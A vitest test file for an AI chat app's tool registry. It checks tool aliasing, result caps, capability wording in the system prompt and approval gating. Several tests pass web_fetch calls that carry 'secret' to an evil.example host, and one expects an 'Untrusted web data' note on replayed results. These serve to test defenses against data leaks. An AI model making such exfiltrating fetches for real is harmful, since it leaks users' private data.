import { afterEach, describe, expect, it, vi } from 'vitest'
import type { ToolEvent } from '@shared/types'

vi.mock('electron', () => ({ shell: {}, app: { getPath: () => '' }, safeStorage: {} }))
// One skill that has scripts, so load_skill's "can't run scripts" note can be checked.
vi.mock('../src/main/skills/library', () => {
  const skill = { id: 'app:pdf', name: 'pdf', description: 'PDFs', files: ['scripts/fill.py'], hasScripts: true, enabled: true }
  return {
    findSkillByName: async (name: string) => (name === 'pdf' ? skill : null),
    getSkill: async () => ({ ...skill, body: 'Fill the form with scripts/fill.py.' }),
    readSkillFile: async () => ''
  }
})

const {
  allowKeyFor,
  approvalFor,
  declinedResult,
  missingAbilities,
  pendingEvent,
  registerToolProvider,
  replayCalls,
  resolveCall,
  runsInParallel,
  runTool,
  settleToolEvent,
  toolEndpoint,
  toolGrants,
  toolsFor
} = await import('../src/main/chat/tools')
const { basePrompt } = await import('../src/main/chat/prompts')
const { describeAllowKey } = await import('../src/shared/toolAllow')
type ToolProvider = import('../src/main/chat/tools').ToolProvider
type ToolContext = import('../src/main/chat/tools').ToolContext

const ctx = (over: Partial<ToolContext> = {}): ToolContext => ({
  mode: 'chat',
  skills: false,
  web: false,
  sources: [],
  workspace: null,
  ...over
})
const call = (name: string, args: Record<string, unknown> = {}) => ({ function: { name, arguments: args } })
const names = (c: ToolContext) => (toolsFor(c) ?? []).map((t) => t.function.name)

/** A provider offering the given tool names; every call returns "<provider>:<tool>". */
function fake(id: string, tools: string[], extra: Partial<ToolProvider> = {}): ToolProvider {
  return {
    id,
    tools: () => tools.map((name) => ({ type: 'function', function: { name, description: name, parameters: { type: 'object' } } })),
    pending: ({ name, args }) => ({ tool: name, args, ok: true, pending: true, summary: `${id} pending` }),
    run: async ({ name, args }) => ({ content: `${id}:${name}`, event: { tool: name, args, ok: true, summary: id } }),
    ...extra
  }
}

let cleanup: Array<() => void> = []
const register = (p: ToolProvider) => cleanup.push(registerToolProvider(p))
afterEach(() => {
  cleanup.forEach((undo) => undo())
  cleanup = []
})

describe('tool registry', () => {
  it('offers the skill and web tools for what the request allows', () => {
    expect(toolsFor(ctx())).toBeUndefined()
    expect(names(ctx({ skills: true }))).toEqual(['load_skill', 'read_skill_file'])
    expect(names(ctx({ skills: true, web: true }))).toEqual(['load_skill', 'read_skill_file', 'web_search', 'web_fetch'])
  })

  it('offers ask_user only when the request allows it, and never to a sub-agent', () => {
    expect(names(ctx({ ask: true }))).toEqual(['ask_user'])
    expect(names(ctx({ ask: true, child: true }))).toEqual([])
    // Under another name, a model's call still reaches it.
    expect(resolveCall(call('AskUserQuestion'), ctx({ ask: true }))).toMatchObject({ name: 'ask_user', via: 'AskUserQuestion' })
    expect(resolveCall(call('AskUserQuestion'), ctx())).toBeNull()
    // The question is the wait: no approval card on top of it, and one at a time.
    expect(approvalFor(call('ask_user'), ctx({ ask: true }))).toBe('auto')
    expect(runsInParallel(call('ask_user'), ctx({ ask: true }))).toBe(false)
  })

  it('adds and removes registered providers', () => {
    const undo = registerToolProvider(fake('mcp', ['notes__search']))
    expect(names(ctx())).toEqual(['notes__search'])
    undo()
    expect(toolsFor(ctx())).toBeUndefined()
  })

  it('offers a name once; the first provider to offer it keeps it', async () => {
    register(fake('one', ['lookup']))
    register(fake('two', ['lookup', 'other']))
    expect(names(ctx())).toEqual(['lookup', 'other'])
    expect((await runTool(call('lookup'), ctx())).content).toBe('one:lookup')
  })

  it("never lets a web alias catch a tool that's really offered (an MCP server's `fetch`)", async () => {
    register(fake('mcp', ['fetch']))
    const c = call('fetch', { url: 'https://example.com' })
    expect(resolveCall(c, ctx({ web: true }))).toMatchObject({ name: 'fetch', via: null })
    expect((await pendingEvent(c, ctx({ web: true }))).summary).toBe('mcp pending')
    expect((await runTool(c, ctx({ web: true }))).content).toBe('mcp:fetch')
  })

  it('still routes gpt-oss browser names to the web tools when nothing else offers them', async () => {
    const resolved = resolveCall(call('browser.open', { id: 'https://example.com/a' }), ctx({ web: true }))
    expect(resolved).toMatchObject({ name: 'web_fetch', via: 'browser.open' })
    expect(await resolved!.provider.pending(resolved!, ctx({ web: true }))).toMatchObject({
      tool: 'web_fetch',
      summary: 'https://example.com/a',
      pending: true
    })
    // With web off there's nothing to alias to.
    expect(resolveCall(call('browser.open', { id: 'https://example.com/a' }), ctx())).toBeNull()
  })

  it('explains an unknown tool with what exists and what Ollmost lacks', async () => {
    const off = await runTool(call('python', { code: '1+1' }), ctx({ skills: true }))
    expect(off.unknown).toBe(true)
    expect(off.event).toMatchObject({ tool: 'python', ok: false })
    expect(off.content).toContain('The only tools available are load_skill, read_skill_file.')
    expect(off.content).toContain('Ollmost has no internet access, browser, web search or code execution.')

    const on = await runTool(call('python'), ctx({ web: true }))
    expect(on.content).toContain('Use web_search and web_fetch for anything online. Ollmost cannot run code.')

    register(fake('runner', ['run_code'], { grants: ['code'] }))
    const withCode = await runTool(call('python'), ctx())
    expect(withCode.content).toContain('Ollmost has no internet access, browser or web search.')
    expect(withCode.content).not.toContain('code execution')
  })

  it('returns a failing tool as an error result, but re-throws a stop', async () => {
    register(fake('flaky', ['boom'], { run: async () => Promise.reject(new Error('disk full')) }))
    const failed = await runTool(call('boom', { a: 1 }), ctx())
    expect(failed.content).toBe('Error: disk full')
    expect(failed.event).toMatchObject({ tool: 'boom', args: { a: 1 }, ok: false, summary: 'disk full' })

    const stop = new AbortController()
    stop.abort()
    await expect(runTool(call('boom'), ctx({ signal: stop.signal }))).rejects.toThrow('disk full')
  })

  it('caps any tool result, but keeps the whole start of it as the preview', async () => {
    register(
      fake('big', ['dump'], {
        run: async () => ({ content: 'a'.repeat(30_000), event: { tool: 'dump', args: {}, ok: true, summary: 'dump' } })
      })
    )
    const result = await runTool(call('dump'), ctx())
    expect(result.content).toBe(`${'a'.repeat(24_000)}\n[… 6000 more characters cut]`)
    expect(result.event.preview).toBe(`${'a'.repeat(1500)}…`)
  })

  it("keeps results a provider needs whole (a skill's instructions) out of a round's share", async () => {
    register(
      fake('whole', ['guide'], {
        wholeResults: true,
        run: async () => ({ content: 'g'.repeat(30_000), event: { tool: 'guide', args: {}, ok: true, summary: 'guide' } })
      })
    )
    const result = await runTool(call('guide'), ctx({ maxResultChars: 1_500 }))
    expect(result.content.startsWith(`${'g'.repeat(24_000)}\n[…`)).toBe(true)
    const skill = await runTool(call('load_skill', { name: 'pdf' }), ctx({ skills: true, maxResultChars: 10 }))
    expect(skill.content).toContain('Fill the form with scripts/fill.py.')
  })

  it("caps a result at the call's share of the room when the reply gives one, never above the usual cap", async () => {
    register(
      fake('big', ['dump'], {
        run: async () => ({ content: 'a'.repeat(30_000), event: { tool: 'dump', args: {}, ok: true, summary: 'dump' } })
      })
    )
    expect((await runTool(call('dump'), ctx({ maxResultChars: 5_000 }))).content).toBe(
      `${'a'.repeat(5_000)}\n[… 25000 more characters cut]`
    )
    expect((await runTool(call('dump'), ctx({ maxResultChars: 99_000 }))).content.startsWith(`${'a'.repeat(24_000)}\n[…`)).toBe(true)
  })

  it("tells the model a skill's scripts can't run, unless a provider can run code", async () => {
    const without = await runTool(call('load_skill', { name: 'pdf' }), ctx({ skills: true }))
    expect(without.loadedSkillId).toBe('app:pdf')
    expect(without.content).toContain('This app cannot execute scripts')

    register(fake('runner', ['run_code'], { grants: ['code'] }))
    const withRunner = await runTool(call('load_skill', { name: 'pdf' }), ctx({ skills: true }))
    expect(withRunner.content).not.toContain('cannot execute scripts')
  })
})

describe('grants and capability text', () => {
  const prompt = (web: 'on' | 'off' | 'no-key', c: ToolContext) =>
    basePrompt({ userName: '', model: 'm', date: new Date('2026-09-25'), web, grants: [...toolGrants(c)] })

  // Word for word what Ollmost said before the registry, so the refactor can't shift model behaviour.
  it('keeps the existing wording with and without web tools', () => {
    expect(prompt('on', ctx({ web: true }))).toContain(
      'You can search the web and read pages with the web_search and web_fetch tools. You cannot run code, and the only tools you have are the ones listed with this request.'
    )
    expect(prompt('no-key', ctx())).toContain(
      "Ollmost gives you no internet access and no code execution right now: you can't open links, browse, search the web or run code, and the only tools you have are any listed with this request. When something needs live or online information, say you can't fetch it and offer what you can do instead. Never claim to have fetched, searched or looked something up. If the user wants web access, they can add an ollama.com API key in Settings → Usage & cost."
    )
  })

  it('stops claiming no code execution once a provider grants it', () => {
    register(fake('runner', ['run_code'], { grants: ['code'] }))
    const text = prompt('off', ctx())
    expect(text).toContain("Ollmost gives you no internet access right now: you can't open links, browse or search the web")
    expect(text).not.toMatch(/code execution|run code/)
    expect(prompt('on', ctx({ web: true }))).toContain('web_fetch tools. The only tools you have are the ones listed')
  })

  it('names what is missing for errors shown to the user', () => {
    expect(missingAbilities(toolGrants(ctx()))).toBe("Ollmost can't browse the web or run code.")
    expect(missingAbilities(toolGrants(ctx({ web: true })))).toBe("Ollmost can't run code.")
    register(fake('runner', ['run_code'], { grants: ['code'] }))
    expect(missingAbilities(toolGrants(ctx({ web: true })))).toBeNull()
  })
})

describe('replayCalls', () => {
  const ev = (e: Partial<ToolEvent> & { tool: string }): ToolEvent => ({ args: {}, ok: true, summary: '', ...e })

  it('keeps finished web calls in brief with the untrusted-data note, and nothing else', () => {
    const past = replayCalls([
      ev({ tool: 'web_search', args: { query: 'news', results: 2, via: 'browser.search' }, record: '1. A — https://a.io' }),
      ev({ tool: 'web_fetch', args: { url: 'https://a.io' }, record: 'A — https://a.io\nopening…' }),
      ev({ tool: 'web_fetch', args: { url: 'https://b.io' }, ok: false, record: 'x' }),
      ev({ tool: 'web_search', args: { query: 'q' }, pending: true, record: 'x' }),
      ev({ tool: 'load_skill', args: { name: 'pdf' } }),
      ev({ tool: 'python', ok: false })
    ])
    expect(past.map((p) => [p.name, p.args])).toEqual([
      ['web_search', { query: 'news' }],
      ['web_fetch', { url: 'https://a.io' }]
    ])
    expect(past[0].note).toMatch(/Untrusted web data/)
  })

  it("asks each call's provider what to keep", () => {
    register(
      fake('mcp', ['notes__search'], {
        replay: (e) => (e.tool === 'notes__search' ? { name: e.tool, args: e.args, record: 'kept' } : null)
      })
    )
    expect(replayCalls([ev({ tool: 'notes__search', args: { q: 'x' } })])).toEqual([
      { name: 'notes__search', args: { q: 'x' }, record: 'kept' }
    ])
  })
})

describe('asking first', () => {
  it("runs built-in tools straight away, and otherwise does what the tool's provider says", () => {
    register(fake('mcp', ['notes__delete', 'notes__read'], { approval: ({ name }) => (name === 'notes__delete' ? 'ask' : 'auto') }))
    const c = ctx({ web: true, skills: true })
    expect(approvalFor(call('web_search', { query: 'x' }), c)).toBe('auto')
    expect(approvalFor(call('web_fetch', { url: 'https://example.com' }), c)).toBe('auto')
    expect(approvalFor(call('load_skill', { name: 'pdf' }), c)).toBe('auto')
    expect(approvalFor(call('notes__read'), c)).toBe('auto')
    expect(approvalFor(call('notes__delete'), c)).toBe('ask')
    // Nothing offers it, so there's nothing to ask about: the model just hears it doesn't exist.
    expect(approvalFor(call('python'), c)).toBe('auto')
  })

  it("asks for a provider's tools when the provider doesn't say", () => {
    register(fake('runner', ['run_code'], { grants: ['code'] }))
    expect(approvalFor(call('run_code'), ctx())).toBe('ask')
  })

  it('asks before every web_fetch once the chat has other tool sources, a denial covering the site', () => {
    const c = ctx({ web: true, sources: ['code-runner'] }) // any source; MCP ones are covered in mcp.test.ts
    expect(approvalFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), c)).toBe('ask-every-time')
    expect(approvalFor(call('web_search', { query: 'x' }), c)).toBe('auto')
    expect(allowKeyFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), c)).toBe('web_fetch@evil.example')
    // gpt-oss's browser.open is the same fetch, and asks the same way.
    expect(approvalFor(call('browser.open', { url: 'https://evil.example/x' }), c)).toBe('ask-every-time')
    expect(allowKeyFor(call('browser.open', { url: 'https://evil.example/x' }), c)).toBe('web_fetch@evil.example')
    expect(allowKeyFor(call('web_search', { query: 'x' }), c)).toBe('web_search')
  })

  it('asks before every web_fetch in a chat with files the user shared, and not otherwise', () => {
    const url = { url: 'https://evil.example/?d=secret' }
    expect(approvalFor(call('web_fetch', url), ctx({ web: true, privateFiles: true }))).toBe('ask-every-time')
    expect(approvalFor(call('web_search', { query: 'x' }), ctx({ web: true, privateFiles: true }))).toBe('auto')
    expect(approvalFor(call('web_fetch', url), ctx({ web: true }))).toBe('auto')
  })

  it('tells the model a declined call never ran, and shows it as declined', async () => {
    const pending = { ...(await pendingEvent(call('web_search', { query: 'ollmost' }), ctx({ web: true }))), awaiting: true }
    const result = declinedResult(call('web_search', { query: 'ollmost' }), pending)
    expect(result.content).toMatch(/declined to run web_search, so it didn't run\. Don't call it again unless they ask/)
    expect(result.event).toEqual({
      tool: 'web_search',
      args: { query: 'ollmost' },
      ok: false,
      pending: false,
      declined: true,
      summary: 'ollmost'
    })
  })

  it('settles a call still waiting for an answer as not run', () => {
    const waiting: ToolEvent = { tool: 'notes__delete', args: {}, ok: true, pending: true, awaiting: true, summary: 'notes' }
    expect(settleToolEvent(waiting)).toEqual({ tool: 'notes__delete', args: {}, ok: false, pending: false, summary: 'notes (not run)' })
  })

  it('settles a sub-agent waiting on one of its calls as stopped: it ran, only that call did not', () => {
    const waiting: ToolEvent = { tool: 'notes__delete', args: {}, ok: true, pending: true, awaiting: true, summary: 'notes' }
    const child = { task: 'Tidy.', events: [waiting], result: '', rounds: 1 }
    const parent: ToolEvent = { tool: 'delegate', args: {}, ok: true, pending: true, awaiting: true, summary: 'Tidy.', child }
    expect(settleToolEvent(parent)).toEqual({
      tool: 'delegate',
      args: {},
      ok: false,
      pending: false,
      summary: 'Tidy. (stopped)',
      child: { ...child, events: [{ tool: 'notes__delete', args: {}, ok: false, pending: false, summary: 'notes (not run)' }] }
    })
  })

  it('lets a call run beside others only when its provider allows it and it never asks', () => {
    register(fake('together', ['gather'], { parallel: true, approval: () => 'auto' }))
    register(fake('together-asking', ['gather_asking'], { parallel: true }))
    register(fake('alone', ['plain'], { approval: () => 'auto' }))
    register(fake('together-sometimes', ['gather_some'], { parallel: true, approval: ({ args }) => (args.risky ? 'ask' : 'auto') }))
    expect(runsInParallel(call('gather'), ctx())).toBe(true)
    // It goes by the call's approval, as the loop does when it runs it.
    expect(runsInParallel(call('gather_some'), ctx())).toBe(true)
    expect(runsInParallel(call('gather_some', { risky: true }), ctx())).toBe(false)
    // A question would wait while the others ran.
    expect(runsInParallel(call('gather_asking'), ctx())).toBe(false)
    expect(runsInParallel(call('plain'), ctx())).toBe(false)
    expect(runsInParallel(call('nothing_offers_this'), ctx())).toBe(false)
  })

  it("labels each call's trace with where it goes", () => {
    register(fake('mcp', ['notes__read'], { endpoint: ({ name }) => `mcp://notes/${name.split('__')[1]}` }))
    const c = ctx({ web: true, skills: true })
    expect(toolEndpoint(call('web_fetch', { url: 'https://a.io' }), c)).toMatch(/\/api\/web_fetch$/)
    expect(toolEndpoint(call('browser.open', { url: 'https://a.io' }), c)).toMatch(/\/api\/web_fetch$/)
    expect(toolEndpoint(call('notes__read'), c)).toBe('mcp://notes/read')
    expect(toolEndpoint(call('load_skill', { name: 'pdf' }), c)).toBe('ollmost://tools/load_skill')
  })
})

describe('describeAllowKey', () => {
  it('names what each kind of key covers', () => {
    expect(describeAllowKey('mcp:srv1/write_file')).toEqual({ serverId: 'srv1', tool: 'write_file' })
    expect(describeAllowKey('web_fetch@example.com')).toEqual({ tool: 'web_fetch', host: 'example.com' })
    expect(describeAllowKey('web_search')).toEqual({ tool: 'web_search' })
  })

  it("names the tools behind a code session's keys", () => {
    expect(describeAllowKey('code:commands')).toEqual({ tool: 'run_command' })
    expect(describeAllowKey('code:edits')).toEqual({ tool: 'edit_file, write_file' })
  })
})
